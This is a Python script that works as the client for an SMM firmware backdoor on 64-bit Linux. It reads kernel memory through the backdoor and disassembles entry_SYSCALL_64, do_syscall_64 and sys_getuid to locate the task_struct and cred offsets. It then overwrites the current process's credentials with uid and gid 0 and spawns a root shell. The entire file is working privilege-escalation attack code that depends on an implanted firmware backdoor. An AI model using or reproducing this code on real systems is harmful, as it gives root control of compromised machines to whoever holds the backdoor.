#!/usr/bin/env python

import sys, os, platform, ctypes
from struct import pack, unpack

import smm_backdoor as bd

try:

    import capstone

except ImportError:

    print('ERROR: Capstone engine is not installed')
    exit(-1)


# MSR registers
LSTAR = 0xc0000082
IA32_KERNEL_GS_BASE = 0xc0000102

# getuid() syscal number
NR_getuid = 102

# struct cred field offsets
cred_uid  = 4 * 1
cred_gid  = 4 * 2
cred_suid = 4 * 3
cred_sgid = 4 * 4
cred_euid = 4 * 5
cred_egid = 4 * 6


def find_task_struct(cr3 = None, entry_SYSCALL_64 = None):

    to_ulong_64 = lambda val: unpack('Q', pack('q', val))[0]

    if cr3 is None:

        cr3 = bd.state_get(bd.SMM_SAVE_STATE_CR3)

        print('[+] User CR3 = 0x%x' % cr3)

    if entry_SYSCALL_64 is None:

        entry_SYSCALL_64 = bd.msr_get(LSTAR)

        print('[+] LSTAR = 0x%x' % entry_SYSCALL_64)

    # needed kernel symbols
    do_syscall_64 = None
    sys_call_table = None

    # needed offsets
    task_struct = None
    task_struct_cred = None

    # kernel CR3 value for PTI enabled system
    cr3_kern = None

    data = bd.read_virt_mem(entry_SYSCALL_64, 0x100, cr3 = cr3)

    md = capstone.Cs(capstone.CS_ARCH_X86, capstone.CS_MODE_64)
    md.detail = True    

    # disassemble entry_SYSCALL_64()
    for insn in md.disasm(data, entry_SYSCALL_64):    

        if insn.id == capstone.x86.X86_INS_AND:

            # check for the SWITCH_TO_KERNEL_CR3
            if insn.operands[0].type == capstone.x86.X86_OP_REG and \
               insn.operands[1].type == capstone.x86.X86_OP_IMM:

                if insn.operands[0].reg == capstone.x86.X86_REG_RSP:

                    # obtain kernel CR3 value
                    cr3_kern = cr3 & to_ulong_64(insn.operands[1].imm)

                    print('[+] Kernel CR3 = 0x%x' % cr3_kern)

        if insn.id == capstone.x86.X86_INS_MOV:

            # check for the entry_SYSCALL_64_stage2() jump
            if insn.operands[0].type == capstone.x86.X86_OP_REG and \
               insn.operands[1].type == capstone.x86.X86_OP_IMM:

                if insn.operands[0].reg == capstone.x86.X86_REG_RDI and cr3_kern is not None:

                    entry_SYSCALL_64_stage2 = to_ulong_64(insn.operands[1].imm)

                    print('[+] entry_SYSCALL_64_stage2() is at 0x%x' % entry_SYSCALL_64_stage2)

                    # analyze entry_SYSCALL_64_stage2() on KPTI enabled system
                    return find_task_struct(cr3 = cr3_kern, entry_SYSCALL_64 = entry_SYSCALL_64_stage2)
        
        if insn.id == capstone.x86.X86_INS_CALL:

            # check for the do_syscall_64() call
            if insn.operands[0].type == capstone.x86.X86_OP_IMM:

                do_syscall_64 = to_ulong_64(insn.operands[0].imm)            
                break

    if do_syscall_64 is None:

        print('ERROR: Unable to find do_syscall_64()')
        return None

    print('[+] do_syscall_64() is at 0x%x' % do_syscall_64)

    data = bd.read_virt_mem(do_syscall_64, 0x100, cr3 = cr3)

    md = capstone.Cs(capstone.CS_ARCH_X86, capstone.CS_MODE_64)
    md.detail = True

    # disassemble do_syscall_64()
    for insn in md.disasm(data, do_syscall_64):    

        if insn.id == capstone.x86.X86_INS_MOV:

            if insn.operands[0].type == capstone.x86.X86_OP_REG and \
               insn.operands[1].type == capstone.x86.X86_OP_MEM:

                op = insn.operands[1].mem

                if op.disp != 0 and op.scale == 8 and op.segment == capstone.x86.X86_REG_INVALID:
                
                    # obtain sys_call_table address
                    sys_call_table = to_ulong_64(op.base + op.disp)
                    break

    if sys_call_table is None:

        print('ERROR: Unable to find sys_call_table')
        return None

    print('[+] sys_call_table() is at 0x%x' % sys_call_table)

    # obtain sys_getuid() handler address
    sys_getuid = bd.read_virt_mem_8(sys_call_table + (NR_getuid * 8), cr3 = cr3)

    print('[+] sys_getuid() is at 0x%x' % sys_getuid)

    data = bd.read_virt_mem(sys_getuid, 0x100, cr3 = cr3)

    md = capstone.Cs(capstone.CS_ARCH_X86, capstone.CS_MODE_64)
    md.detail = True

    insn_prev = None

    # disassemble sys_getuid()
    for insn in md.disasm(data, sys_getuid):    

        if task_struct is None:

            if insn.id == capstone.x86.X86_INS_MOV:

                # check for the task_struct access
                if insn.operands[0].type == capstone.x86.X86_OP_REG and \
                   insn.operands[1].type == capstone.x86.X86_OP_MEM:

                    op = insn.operands[1].mem

                    if op.disp != 0 and op.segment == capstone.x86.X86_REG_GS:

                        insn_prev = insn
                        task_struct = op.disp
                        continue

        else:

            if insn.id == capstone.x86.X86_INS_MOV:

                # check for the task_struct->cred access in the next instruction
                if insn.operands[0].type == capstone.x86.X86_OP_REG and \
                   insn.operands[1].type == capstone.x86.X86_OP_MEM:

                    op = insn.operands[1].mem

                    if op.disp != 0 and op.base == insn_prev.operands[0].reg:

                        task_struct_cred = op.disp                
            break

    if task_struct is None:

        print('ERROR: Unable to find task_struct offset')
        return None

    if task_struct_cred is None:

        print('ERROR: Unable to find cred offset')
        return None

    return cr3, task_struct, task_struct_cred


def privesc(command_line = None, uid = 0, gid = 0, euid = 0, egid = 0):

    # obtain kernel CR3 and needed offsets
    ret = find_task_struct()
    if ret is None:

        print('ERROR: find_task_struct() failed')
        return -1

    cr3, task_struct, task_struct_cred = ret

    print('[+] task_struct offset is 0x%x' % task_struct)
    print('[+] cred offset is 0x%x' % task_struct_cred)

    # get kernel GS segment base
    gs_base = bd.msr_get(IA32_KERNEL_GS_BASE)

    print('[+] IA32_KERNEL_GS_BASE = 0x%x' % gs_base)

    # get task_struct address for current process
    addr_task_struct = bd.read_virt_mem_8(gs_base + task_struct, cr3 = cr3)

    print('[+] Process task_struct is at 0x%x' % addr_task_struct)

    # get task_struct->cred address
    addr_task_struct_cred = bd.read_virt_mem_8(addr_task_struct + task_struct_cred, cr3 = cr3)

    print('[+] Process cred is at 0x%x' % addr_task_struct_cred)

    task_struct_get = lambda offs: bd.read_virt_mem_4(addr_task_struct_cred + offs, cr3 = cr3)
    task_struct_set = lambda offs, val: bd.write_virt_mem_4(addr_task_struct_cred + offs, val, cr3 = cr3)

    # read current uid/gid/euid/egid values
    curr_uid = task_struct_get(cred_uid)
    curr_gid = task_struct_get(cred_gid)
    curr_euid = task_struct_get(cred_euid)
    curr_egid = task_struct_get(cred_egid)

    # sanity check
    if curr_uid != os.getuid() or curr_euid != os.geteuid() or \
       curr_gid != os.getuid() or curr_euid != os.getegid():

        print('ERROR: Bogus cred')
        return -1

    print('[+] Overwriting process credentials...')

    # overwrite task_struct->cred fields
    task_struct_set(cred_uid, uid)
    task_struct_set(cred_gid, gid)
    task_struct_set(cred_suid, uid)
    task_struct_set(cred_sgid, gid)
    task_struct_set(cred_euid, euid)
    task_struct_set(cred_egid, egid)

    if command_line is None:

        print('[+] Done, spawning root shell...\n')

        # spawn shell
        os.system('/bin/sh')

    else:

        os.system(command_line)

    return 0


def main():

    # check OS
    assert platform.system() == 'Linux'

    # check for 64-bit process
    assert ctypes.sizeof(ctypes.c_void_p) == ctypes.sizeof(ctypes.c_uint64)

    print('[+] Initializing SMM backdoor client...')

    bd.init(use_timer = True)
    bd.ping()

    return privesc()    


if __name__ == '__main__':

    exit(main())

#
# EoF
#
